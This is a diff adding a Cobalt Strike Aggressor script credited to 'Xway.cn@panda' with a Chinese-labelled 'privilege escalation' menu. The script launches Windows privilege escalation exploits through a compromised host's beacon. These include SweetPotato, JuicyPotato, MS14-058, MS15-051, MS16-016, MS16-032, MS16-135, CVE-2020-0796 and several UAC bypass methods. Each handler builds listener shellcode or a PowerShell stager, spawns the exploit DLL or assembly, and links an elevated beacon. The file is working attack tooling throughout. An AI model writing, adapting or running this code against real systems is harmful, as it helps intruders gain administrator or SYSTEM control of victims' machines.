@@ -1,0 +1,256 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       Xway.cn@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+	menu "权限提升" {
+@aggressor =  ls(script_resource("/modules/aggressor"));
+println("[+] Importing:");
+foreach $file (@aggressor){ 
+	include($file);
+	println("   $file");
+}
+
+		item "Watson" {
+			$bid = $1;
+			$dialog = dialog("Watson", %(bid => $bid), &Watson);
+			dialog_description($dialog, "获取可用于提权的漏洞。支持Windows 10 1507、1511、1607、1703、1709、1803、1809、windows server 2016和2019。");
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+		item "dazzleUP" {
+			bdllspawn($1, script_resource("/script/dazzleUP_Reflective_DLL.x64.dll"), $2, "dazzleUP", 5000, false);
+		}
+sub Watson {
+	bexecute_assembly($bid, script_resource("/script/Watson.exe"), "");
+}
+            item "SweetPotato"{
+                $bid = $1['@'];
+                $Dialog = dialog("Sweet Potato",%(bid => $bid),&SweetPotato);
+                dialog_description($Dialog, "MS16-075");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub SweetPotato {
+	local('$shellcode $arch $program $exe $parm');
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " SweetPotato (ms16-075)");
+    if (-is64 $bid)
+    {
+        $arch = "x64";
+	} else {
+        $arch = "x86";
+	}
+	$program = "c:\\windows\\system32\\werfault.exe";
+	$exe = script_resource("/script/SweetPotato.exe");
+	$shellcode = base64_encode(artifact_payload($3['listener'], "raw", $arch));
+	$parm = "-l 6363 "."-p $program "."-s $shellcode";
+    bexecute_assembly!($bid, $exe, $parm);
+	beacon_link($bid, $null, $3['listener']);
+}
+
+            item "juicypotato"{
+                $bid = $1['@'];
+                $Dialog = dialog("juicypotato",%(bid => $bid),&juicypotato);
+                dialog_description($Dialog, "juicypotato(ms16-075)");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub juicypotato {
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " JuicyPotato (ms16-075)");
+    
+    if (-is64 $bid)
+    {
+        $arch = "x64";
+        $dll = script_resource("/script/JuicyPotato.x64.dll");
+    } else {
+        $arch = "x86";
+        $dll = script_resource("/script/JuicyPotato.x86.dll");
+    }
+
+    $stager = shellcode($3['listener'], false, $arch);
+
+    bdllspawn!($bid, $dll, $stager, "NTLM DCOM->RPC NTLM Reflection (MS16-075)", 5000);
+    
+    bstage($bid, $null, $3['listener'], $arch);
+}
+
+            item "MS14-058"{
+                $bid = $1['@'];
+                $Dialog = dialog("MS14-058",%(bid => $bid),&ms14_058_exploit);
+                dialog_description($Dialog, "MS14-058");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+
+sub ms14_058_exploit {
+	local('$stager $arch $dll');
+	btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " ms14-058");
+	if (-is64 $bid) {
+		$arch   = "x64";
+		$dll    = script_resource("/script/cve-2014-4113.x64.dll");
+	}
+	else {
+		$arch   = "x86";
+		$dll    = script_resource("/script/cve-2014-4113.x86.dll");
+	}
+	$stager = payload($3['listener'], $arch);
+
+	bdllspawn!($bid, $dll, $stager, "ms14-058", 5000);
+	beacon_link($bid, $null, $3['listener']);
+}
+
+            item "MS15-051"{
+                $bid = $1['@'];
+                $Dialog = dialog("MS15-051",%(bid => $bid),&ms15_051_exploit);
+                dialog_description($Dialog, "MS15-051");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub ms15_051_exploit {
+
+	btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " ms15-051");
+	if (-is64 $bid) {
+		$arch   = "x64";
+		$dll    = script_resource("/script/cve-2015-1701.x64.dll");
+	}
+	else {
+		$arch   = "x86";
+		$dll    = script_resource("/script/cve-2015-1701.x86.dll");
+	}
+	$stager = shellcode($3['listener'], false, $arch);
+	if ($stager is $null) {
+		berror($bid, "No $arch stager for listener ' $+ $3['listener'] $+ '");
+		return;
+	}
+
+	bdllspawn!($bid, $dll, $stager, "ms15-051", 5000);
+	bstage($bid, $null, $3['listener'], $arch);
+}
+            item "MS16-016"{
+                $bid = $1['@'];
+                $Dialog = dialog("MS16-016",%(bid => $bid),&ms16_016_exploit);
+                dialog_description($Dialog, "MS16-016");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub ms16_016_exploit {
+
+	if (-is64 $bid) {
+		berror($bid, "ms16-016 exploit is x86 only");
+		return;
+	}
+
+	btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " ms16-016");
+
+	$stager = shellcode($3['listener'], false, "x86");
+
+	bdllspawn!($bid, script_resource("/script/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
+
+	bstage($bid, $null, $3['listener'], $arch);
+}
+            item "MS16-032"{
+                $bid = $1['@'];
+                $Dialog = dialog("MS16-032",%(bid => $bid),&ms16_032_exploit);
+                dialog_description($Dialog, "MS16-032");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub ms16_032_exploit {
+	local('$script $oneliner');
+
+	btask($bid, "Tasked Beacon to run " . listener_describe($3['listener']) . " ms16-032");
+
+	$script = artifact($3['listener'], "powershell");
+
+	$oneliner = beacon_host_script($bid, $script);
+
+	bpowershell_import!($bid, script_resource("/script/Invoke-MS16032.ps1"));
+	bpowerpick!($bid, "Invoke-MS16032 -Command \" $+ $oneliner $+ \"");
+
+	bpause($bid, 10000);
+
+	bstage($bid, $null, $3['listener']);
+}
+            item "MS16-135"{
+                $bid = $1['@'];
+                $Dialog = dialog("MS16-135",%(bid => $bid),&ms16_135_exploit);
+                dialog_description($Dialog, "MS16-135");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub ms16_135_exploit {
+
+	local('$script $oneliner');
+	btask($bid, "Tasked Beacon to run " . listener_describe($3['listener']) . " MS16-135");
+	$script = artifact($3['listener'], "powershell");
+	$oneliner = beacon_host_script($bid, $script);
+	$source = script_resource("/script/Invoke-MS16135.ps1");
+	bpowershell_import!($bid, $source);
+	bpowerpick!($bid, "Invoke-MS16135 -Command \" $+ $oneliner $+ \"");
+	bpause($bid, 10000);
+	bstage($bid, $null, $3['listener']);
+
+}
+            item "CVE-2020-0796"{
+                $bid = $1['@'];
+                $Dialog = dialog("cve_2020_0796_exploit",%(bid => $bid),&cve_2020_0796_exploit);
+                dialog_description($Dialog, "Windows 10 versions 1903 - 1909");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+            }
+sub cve_2020_0796_exploit {
+	local('$stager $winbuild');
+
+	if (!-is64 $bid) {
+		berror($bid, "cve-2020-0796 exploit is x64 only");
+		return;
+	}
+
+	$winbuild = binfo($bid, "build");
+	if ($winbuild != 18362 && $winbuild != 18363) {
+		berror($bid, "This exploit only supports Windows 10 versions 1903 - 1909");
+		return;
+	}
+
+	btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " cve-2020-0796");
+
+	$stager = payload_local($bid, $3['listener'], "x64", "thread");
+
+	$stager = pack("I-", strlen($stager)) . $stager;
+
+	bdllspawn!($bid, getFileProper(script_resource("modules"), "/script/CVE-2020-0796.x64.dll"), $stager, "cve-2020-0796", 5000);
+
+	beacon_link($bid, $null, $3['listener']);
+}
+			item "BypassUAC"{
+				$bid = $1;
+				$dialog = dialog("BypassUAC", %(cmd => "VALUE Base64 encoded command to execute",type => "eventvwr",bid => $bid), &BypassUAC);
+				dialog_description($dialog, "命令需进行base64编码,如:Y21kIC9jIHN0YXJ0IGNhbGMuZXhl,DiskCleanup的命令必须以“ && REM”结尾,如:Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ ==。");
+				drow_text($dialog, "cmd", "command:  ");				
+				drow_combobox($dialog, "type", "type:", @("eventvwr", "fodhelper","computerdefaults","sdclt","slui","dikcleanup"));
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }
+sub BypassUAC {
+	$arg = join(' ', @("-b",$3['type'],"-e",$3['cmd']));
+	bexecute_assembly($bid, script_resource("/script/SharpBypassUAC.exe"), $arg);
+}
+
+	}
+
+	
+	
+	
+	
